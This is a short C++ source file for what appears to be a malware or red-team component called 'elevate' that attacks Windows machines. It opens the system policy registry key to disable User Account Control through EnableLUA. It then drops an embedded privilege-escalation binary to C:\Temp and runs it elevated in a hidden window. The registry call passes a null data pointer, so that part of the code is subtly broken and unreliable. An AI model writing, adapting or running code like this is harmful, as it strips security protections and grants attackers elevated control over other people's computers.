#include "elevate.hpp"

std::string componentName = "elevate";

int wmain() {
	Log("[+] Starting " + componentName + ".", componentName);
	Log("[*] Running as " + RunWhoami(), componentName);

	// disable UAC prompt
	HKEY key;

	RegOpenKeyExW(
		HKEY_LOCAL_MACHINE,
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
		0,
		KEY_ALL_ACCESS,
		&key
	);

	RegSetValueExW(
		key,
		L"EnableLUA",
		0,
		REG_DWORD,
		reinterpret_cast<BYTE *>(0),
		sizeof(DWORD)
	);

	// drop privesc to disk
	Log("[+] Writing privesc to disk.", componentName);
	std::ofstream outfile("C:\\Temp\\privesc.exe", std::ios::out | std::ios::binary);
	outfile.write(&privesc[0], sizeof(privesc));
	outfile.close();

	// elevate and spawn privesc
	ShellExecuteW(NULL, L"runas", L"C:\\Temp\\privesc.exe", NULL, NULL, SW_HIDE);

	return 0;
}